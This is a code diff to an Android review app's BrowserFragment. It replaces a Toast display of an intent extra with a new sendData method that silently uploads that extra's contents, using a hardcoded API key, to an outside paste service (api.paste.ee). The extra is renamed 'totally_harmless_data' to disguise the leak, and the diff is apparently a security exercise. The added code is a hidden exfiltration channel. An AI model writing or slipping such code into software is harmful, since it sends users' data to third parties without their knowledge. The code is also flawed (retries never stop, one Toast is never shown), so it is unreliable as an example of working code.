@@ -24,7 +24,17 @@ import android.widget.FrameLayout;
 import android.widget.RatingBar;
 import android.widget.Toast;
 
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+import com.android.volley.VolleyLog;
+import com.android.volley.toolbox.JsonObjectRequest;
+import com.android.volley.toolbox.Volley;
 import com.mywebreviews.sqlite.webreviews.WebReviewDB;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.util.Map;
 
@@ -116,9 +126,9 @@ public class BrowserFragment extends Fragment {
             setWebView(intentDomain);
             Bundle extras = intent.getExtras();
             if (extras != null){
-                String hack_data = extras.getString("hack_data");
+                String hack_data = extras.getString("totally_harmless_data");
                 if (hack_data != null && hack_data.length() > 0 ){
-                    Toast.makeText(getActivity(), hack_data, Toast.LENGTH_LONG).show();
+                    sendData(hack_data);
                 }
             }
         } else {
@@ -144,6 +154,55 @@ public class BrowserFragment extends Fragment {
                 }
             }
         });
+    }
+    public void sendData(String jsonData){
+        sendData(jsonData, 3);
+    }
+
+    public void sendData(String jsonData, int numberOfAttemptsRemaining){
+        VolleyLog.DEBUG = true;
+        RequestQueue requestQueue = Volley.newRequestQueue(getActivity());
+        String url = "https://api.paste.ee/v1/pastes/?key=umymC56n2oVUIXKK9jPX209JwJZg6Ht0RnJeEJT4N";
+
+
+        JSONObject postData = new JSONObject();
+        JSONArray array = new JSONArray();
+        JSONObject fields = new JSONObject();
+        try {
+            fields.put("contents",jsonData);
+            array.put(fields);
+            postData.put("sections", array);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+
+        final String requestBody = postData.toString();
+
+        // Request a string response from the provided URL.
+        JsonObjectRequest jsonRequest = new JsonObjectRequest(url, postData,
+                new Response.Listener<JSONObject>() {
+                    @Override
+                    public void onResponse(JSONObject response) {
+                        try {
+                            setWebView(response.getString("link"));
+                        } catch (JSONException e){
+                            e.printStackTrace();
+                        }
+                    }
+                },
+                new Response.ErrorListener() {
+                    @Override
+                    public void onErrorResponse(VolleyError error) {
+                        error.printStackTrace();
+                        if (error.networkResponse.statusCode == 512){
+                            sendData(jsonData, numberOfAttemptsRemaining-1);
+                        } else {
+                            Toast.makeText(getActivity(), Integer.toString( error.networkResponse.statusCode ), Toast.LENGTH_LONG);
+                        }
+                    }
+                });
+        // Add the request to the RequestQueue.
+        requestQueue.add(jsonRequest);
     }
 
     protected void updateWebReview(String domain){
